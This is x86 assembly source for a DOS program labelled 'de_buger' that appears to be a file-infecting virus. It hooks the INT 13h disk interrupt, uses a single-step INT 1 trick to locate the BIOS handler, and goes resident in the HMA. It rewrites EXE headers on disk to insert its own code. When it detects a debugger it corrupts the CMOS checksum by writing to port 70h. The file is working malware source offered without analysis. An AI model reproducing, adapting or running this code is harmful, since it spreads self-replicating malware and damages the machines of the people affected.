cseg            segment para    public  'code'
de_buger        proc    near
assume          cs:cseg


.186


ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
CMOS_CRC_ERROR  equ     02eh
CMOS_PORT       equ     070h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
DEBUGER_CODE_AT equ     00155h
DENY_NONE       equ     040h
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_GET_INT     equ     03500h
DOS_SET_INT     equ     02500h
EIGHTEEN_BYTES  equ     012h
ENVIRONMENT     equ     02ah
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAR_INDEX_CALL  equ     01effh
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FIVE_BYTES      equ     005h
FORMAT_TRACK    equ     00500h
FOUR_BITS       equ     004h
FOUR_BYTES      equ     004h
GET_ERROR_LEVEL equ     04d00h
GET_STATUS      equ     00100h
HIGH_BYTE       equ     00100h
HMA_SEGMENT     equ     0ffffh
INT_1_VECTOR    equ     00004h
INT_13_VECTOR   equ     0004ch
INVALID_OPCODE  equ     006h
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
MAX_SECTORS     equ     070h
MULTIPLEX_INT   equ     02fh
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
NULL            equ     0000h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
PARAMETER_TABLE equ     001f1h
PARENT_OWNER    equ     00003h
PARENT_PSP      equ     00016h
READ_A_SECTOR   equ     00201h
READ_W_HANDLE   equ     03f00h
RESIZE_MEMORY   equ     04a00h
ROM_SEGMENT     equ     0f000h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SINGLE_STEP     equ     00100h
SINGLE_STEP_INT equ     001h
SIX_BYTES       equ     006h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_HEX      equ     020h
TWENTY_THREE    equ     017h
TWO_BYTES       equ     002h
VERIFY_A_SECTOR equ     00401h
WRITE_A_SECTOR  equ     00301h
WRITE_COMMAND   equ     060h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE


bios_seg        segment at 0f000h
        org     00000h                  
old_int_13_addr LABEL   BYTE                    
bios_seg        ends


        org     COM_OFFSET              
com_code:

        jmp     short code_start


dummy_exe_head  dw      SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT
        dw      NULL,NULL,NULL,NULL,NULL,TWENTY_HEX


        org     DEBUGER_CODE_AT


debugged        proc    near
        db      08ah                            ;make next line mov ah,bh
blow_cmos:      out     CMOS_PORT,ax
        popa
        popf
        jmp     short end_it
debugged        endp


        org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET


code_start      proc    near      
        mov     dx,offset next_part
        mov     ax,DOS_GET_INT+INVALID_OPCODE
        int     DOS_INT
        mov     ah,high(DOS_SET_INT)
        int     DOS_INT
        db      08dh,0d3h                       ;lea dx,bx (invalid op)
end_it:         push    es
        pop     ds
re_end_it:      int     DOS_INT                 
        mov     ah,high(TERMINATE_W_ERR)
        int     DOS_INT
code_start      endp


next_part       proc    near
        pop     dx
        pop     dx
        mov     dx,bx
        pusha
        push    ds
        mov     di,THREE_BYTES
        mov     bp,word ptr ds:[di+PARENT_PSP-THREE_BYTES]
        push    es
        pop     ds
        int     21h
        dec     bp
        mov     ds,bp
        inc     bp
        mov     si,word ptr ds:[di+PARENT_OWNER-THREE_BYTES]
        xor     bx,bx
        mov     ds,bx
        mov     ax,word ptr ds:[di+INT_1_VECTOR-THREE_BYTES]
        shr     ax,FOUR_BITS
        inc     ax
        add     ax,word ptr ds:[di+INT_1_VECTOR+TWO_BYTES-THREE_BYTES]
        sub     ax,bp
        jc      no_debug
        cmp     si,ax
no_debug:       pop     ds
        mov     al,CMOS_CRC_ERROR
        jnc     blow_cmos
next_part       endp


alloc_memory    proc    near                    
        les     di,dword ptr ds:[bx+di+ENVIRONMENT-THREE_BYTES]
        mov     ax,ALLOCATE_HMA         
        mov     bh,high(SECTOR_SIZE*3)
        push    es                      
        int     MULTIPLEX_INT           
        call    ax_cx_si_cld            
        mov     ah,high(VERIFY_A_SECTOR)
        xchg    bl,bh
        inc     di                      
        jz      find_name
alloc_memory    endp                            


move_to_hma     proc    near                
        rep     movsb 
move_to_hma     endp


set_int_13      proc    near                    
        mov     si,offset interrupt_one
        xchg    di,cx
        mov     ds,di
        xchg    word ptr ds:[bx-TWO_BYTES],si
        push    si                      
        push    word ptr ds:[bx]     
        mov     word ptr ds:[bx],cs  
        pushf                           
        int     SINGLE_STEP_INT         
push_then_call: pushf                           
        call    dword ptr ds:INT_13_VECTOR
        popf                            
        pop     word ptr ds:[bx]     
        pop     word ptr ds:[bx-TWO_BYTES]
set_int_13      endp                            


find_name       proc    near                    
        pop     ds                      
look_for_nulls: inc     bx                      
        xor     word ptr ds:[bx-FOUR_BYTES],di
        jnz     look_for_nulls          
find_name       endp                            


open_file       proc    near                    
        mov     ah,high(FLUSH_BUFFERS)
        int     DOS_INT                 
        xchg    ax,cx
        mov     bp,READ_W_HANDLE+DENY_NONE+ONLY_READ
        xchg    bx,dx
re_convert:     mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
        push    ds
        push    dx                      
        int     DOS_INT
        push    ax                      
        push    cs
        mov     bx,JOB_FILE_TABLE
        pop     ds
        xchg    ax,bx
        int     MULTIPLEX_INT           
        mov     dx,SYS_FILE_TABLE
        mov     bl,byte ptr es:[di]
        db      08bh,0c2h                       ;mov ax,dx (direction bit set)
        int     MULTIPLEX_INT           
        mov     ax,WRITE_W_HANDLE+DENY_NONE+ONLY_WRITE
        xchg    ax,bp
        cmpsw                           
        mov     ch,high(SECTOR_SIZE)
        stosb                          
        pop     bx                      
        int     DOS_INT                 
        mov     ah,high(CLOSE_HANDLE)
        or      byte ptr es:[di+DONT_SET_OFFSET-THREE_BYTES],DONT_SET_TIME
        int     DOS_INT
        push    cs                      
        db      08bh,0dah                       ;mov bx,dx (direction bit set)
        pop     es                      
        call    convert_back            
        pop     dx                      
        pop     ds
        jne     now_run_it              
        repnz   stosb                   
        jmp     short re_convert
open_file       endp


convert_back    proc    near                    
        call    ax_cx_di_si_cld         
        repe    cmps byte ptr cs:[si],es:[di]
        jne     not_de_buger                
        xor     byte ptr ds:[bx],ah
convert_back    endp                    


ax_cx_di_si_cld proc    near                    
        lea     di,word ptr ds:[bx+DEBUGER_CODE_AT-COM_OFFSET]
ax_cx_si_cld:   call    set_si                  
set_si:         cld                             
        mov     cx,offset goto_dos-offset debugged
        pop     ax                      
        sub     ax,set_si-debugged
        db      033h,0f6h                       ;xor si,si (direction bit set)
        xchg    ax,si
        mov     ah,high(XOR_CODE)       
not_de_buger:   ret
ax_cx_di_si_cld endp


now_run_it      proc    near                    
        mov     si,SYS_FILE_TABLE+PARAMETER_TABLE
        mov     bx,offset exec_table
        mov     ah,high(RESIZE_MEMORY)
        int     DOS_INT                 
        db      08bh,0feh                       ;mov di,si (direction bit set)
        mov     ax,EXEC_PROGRAM         
        xchg    si,bx                   
set_table:      scasw                           
        movs    byte ptr es:[di],cs:[si]
        scasb                           
        mov     word ptr es:[di],es     
        je      set_table               
        int     DOS_INT                 
        mov     ah,high(GET_ERROR_LEVEL)
        jmp     re_end_it
now_run_it      endp                            


convert_to      proc    near                    
        pusha                           
        clc                             
        mov     ax,EXE_SIGNATURE        
        pushf                           
        xor     ax,word ptr ds:[bx]     
        jnz     not_exe_header          
        cmp     word ptr ds:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
        jae     not_exe_header          
        cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],SETVER_SIZE          
        je      not_exe_header          
        cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],MAX_SECTORS          
        jae     not_exe_header          
        call    ax_cx_di_si_cld         
        pusha                           
        repe    scasb                   
        popa                            
        jne     not_exe_header          
        xor     byte ptr ds:[bx],ah
        rep     movs byte ptr es:[di],cs:[si]
        popf                            
        stc                             
        pushf                           
not_exe_header: popf                            
        popa                            
        ret                             
convert_to      endp


interrupt_13    proc    far                     
compare_status: cmp     ah,high(GET_STATUS)
        jbe     call_old_int_13         
        push    ds                      
        push    es                      
        pop     ds
        call    convert_to              
        pushf                           
        push    cs                      
        call    call_old_int_13         
        pushf                           
        pusha                           
        mov     ax,WRITE_A_SECTOR
        call    convert_to              
        jnc     do_convertback          
        pushf                           
        push    cs                      
        call    call_old_int_13         
do_convertback: call    convert_back            
        jne     no_need                
        repnz   stosb                   
no_need:        popa                            
        popf                            
        pop     ds
        retf    KEEP_CF_INTACT          
interrupt_13    endp


interrupt_one   proc    far                     
        cmp     ah,high(VERIFY_A_SECTOR)
        jne     interrupt_ret           
        pusha
        push    ds
        db      08bh,0ech                       ;mov bp,sp (direction bit set)
        lds     si,dword ptr ss:[bp+EIGHTEEN_BYTES]
        cmp     word ptr ds:[si+ONE_BYTE],FAR_INDEX_CALL
        jne     go_back                 
        cmp     si,offset push_then_call
        mov     si,word ptr ds:[si+THREE_BYTES]
        je      toggle_tf               
        cmp     byte ptr ds:[si+THREE_BYTES],(high(ROM_SEGMENT))-ONE_BYTE
        jbe     go_back                 
        xchg    di,cx                   
        cld                             
        movsw                           
        std                             
        movsw                           
        db      02bh,0fbh                       ;sub di,bx (direction bit set)
        mov     word ptr ds:[si+TWO_BYTES+bx-SIX_BYTES],es
        mov     word ptr ds:[si],di     
toggle_tf:      xor     byte ptr ss:[bp+TWENTY_THREE],high(SINGLE_STEP)
go_back:        pop     ds
        popa
interrupt_ret:  iret                            
interrupt_one   endp                            


        db      '(Q)'


exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB


        org     COM_OFFSET+SECTOR_SIZE-SIX_BYTES


int_13_entry    proc    near
        cmp     ah,high(FORMAT_TRACK)  
        jb      compare_status          
int_13_entry    endp


        org     COM_OFFSET+SECTOR_SIZE-ONE_BYTE


call_old_int_13 proc    near                    
        jmp     far ptr old_int_13_addr
call_old_int_13 endp


        org     COM_OFFSET+SECTOR_SIZE


goto_dos        proc    near                    
        mov     ax,TERMINATE_W_ERR
        int     DOS_INT                 
goto_dos        endp



de_buger        endp                            
cseg            ends
end             com_code
